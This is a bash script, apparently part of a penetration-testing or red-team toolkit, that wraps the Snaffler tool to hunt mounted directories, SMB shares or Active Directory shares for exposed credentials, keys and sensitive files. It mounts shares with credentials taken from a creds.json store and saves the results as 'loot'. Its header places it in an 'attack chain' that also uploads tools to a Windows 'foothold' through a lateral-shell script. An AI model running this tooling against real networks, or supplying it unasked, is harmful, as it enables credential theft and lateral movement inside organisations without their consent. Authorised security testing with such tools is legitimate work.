#!/usr/bin/env bash
# =============================================================================
#  snaffler_hunt.sh  —  hunt shares/filesystems for secrets with Snaffler (ATOMIC)
# =============================================================================
#  Attack-chain role: point Snaffler at a share or directory you can reach (via
#  a mounted share, direct SMB access, or a lateral_shell.sh session) to surface
#  exposed credentials, keys, and sensitive files.
#
#  Snaffler is a Windows .NET tool. On Kali it runs under `mono`; if mono isn't
#  available, this prints the exact command to run the staged Snaffler.exe on a
#  Windows foothold instead. Findings are written into the run's loot directory.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
snaffler_hunt.sh — run Snaffler against a share/path for exposed secrets (ATOMIC)

USAGE:   ./snaffler_hunt.sh (--path <dir> | --share //host/share | --computer <host>) [--exe <Snaffler.exe>]
EXAMPLE: ./snaffler_hunt.sh --path /mnt/loot-share
         ./snaffler_hunt.sh --share //10.0.0.5/C$      # mounts it (needs a cred + root)

FLAGS:
  --path <dir>        snaffle an already-accessible directory (e.g. a mount)
  --share //h/share   SMB share to mount read-only (uses a creds.json cred) then snaffle
  --computer <host>   AD share discovery via Snaffler -n (best-effort on Kali)
  --exe <path>        Snaffler.exe location (default ~/tools/snaffler/Snaffler.exe)
  -h, --help          this help
  (shared flags -d/--dc-ip/-q: --help-common)

WHAT IT DOES: mono Snaffler.exe -s -o <loot>/snaffler.tsv with -i <path> (or a
  mounted --share, or -n <computer>). Writes findings to the loot dir.
PREREQS: Snaffler.exe staged (setup script puts it at ~/tools/snaffler/); mono on
  Kali; for --share a credential in creds.json + root (cifs mount).
EOF
}

SNAFF_PATH="" SNAFF_SHARE="" SNAFF_COMPUTER="" SNAFF_EXE="$HOME/tools/snaffler/Snaffler.exe"

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    --path) SNAFF_PATH="$2"; shift 2 ;;
    --share) SNAFF_SHARE="$2"; shift 2 ;;
    --computer) SNAFF_COMPUTER="$2"; shift 2 ;;
    --exe) SNAFF_EXE="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$SNAFF_PATH" || -n "$SNAFF_SHARE" || -n "$SNAFF_COMPUTER" ]] \
  || die "need a target: --path <dir>, --share //host/share, or --computer <host>"

log_begin
announce_loot
OUT="$(loot_dir)/snaffler.tsv"

[[ -f "$SNAFF_EXE" ]] || die "Snaffler.exe not found at ${SNAFF_EXE} (stage it with the setup script, or pass --exe)"

# Without mono we can't run the .NET binary on Kali — point at the on-target path.
if ! command -v mono >/dev/null 2>&1; then
  log_warn "mono not installed — cannot run Snaffler on Kali."
  log_warn "Run the staged Snaffler.exe ON a Windows foothold instead (upload via lateral_shell.sh), e.g.:"
  log_warn "  Snaffler.exe -s -o loot.tsv -i C:\\   (or -n <domain> for AD share discovery), then copy loot.tsv back into ${LOOT_DIR}"
  log_end "partial"; exit 0
fi

MOUNTED=""
cleanup_mount() { [[ -n "$MOUNTED" ]] && { umount "$MOUNTED" 2>/dev/null; rmdir "$MOUNTED" 2>/dev/null; }; }
trap cleanup_mount EXIT

# Resolve what Snaffler scans: a path, a mounted share, or AD discovery (-n).
SNAFF_SELECTOR=""
if [[ -n "$SNAFF_PATH" ]]; then
  [[ -d "$SNAFF_PATH" ]] || die "path not found: ${SNAFF_PATH}"
  SNAFF_SELECTOR="-i $(printf '%q' "$SNAFF_PATH")"
elif [[ -n "$SNAFF_SHARE" ]]; then
  need_cmd mount.cifs
  require_creds "$DOMAIN_OVERRIDE"
  [[ "$SEL_STYPE" == "password" ]] || die "--share mount needs a password credential (got ${SEL_STYPE}); mount manually and use --path instead"
  MOUNTED="$(loot_dir)/mnt"; mkdir -p "$MOUNTED"
  log_info "mounting ${SNAFF_SHARE} read-only at ${MOUNTED} as ${SEL_DOMAIN}/${SEL_USER}"
  # Credentials passed via options are redacted in master.log (secret tracked);
  # ro mount so we never write to the share.
  run_cmd "mount -t cifs $(printf '%q' "$SNAFF_SHARE") $(printf '%q' "$MOUNTED") -o ro,username=$(printf '%q' "$SEL_USER"),password=$(printf '%q' "$SEL_SECRET"),domain=$(printf '%q' "${SEL_DOMAIN:-$(resolve_domain)}")" \
    || die "cifs mount failed (need root + cifs-utils, and a valid cred)"
  SNAFF_SELECTOR="-i $(printf '%q' "$MOUNTED")"
else
  SNAFF_SELECTOR="-n $(printf '%q' "$SNAFF_COMPUTER")"
  log_warn "--computer uses Snaffler -n (AD share discovery) — on Kali this needs a usable token; prefer --path/--share if it finds nothing"
fi

log_info "Snaffler hunting → findings to ${OUT}"
run_cmd "mono $(printf '%q' "$SNAFF_EXE") -s -o $(printf '%q' "$OUT") ${SNAFF_SELECTOR}"
if [[ -s "$OUT" ]]; then
  log_ok "Snaffler findings written → ${OUT} ($(grep -c . "$OUT" 2>/dev/null || echo '?') line(s)) — review for creds, then add_cred.sh any you confirm"
else
  log_warn "Snaffler produced no findings file (or it was empty) — check the command output above"
fi
log_end "success"
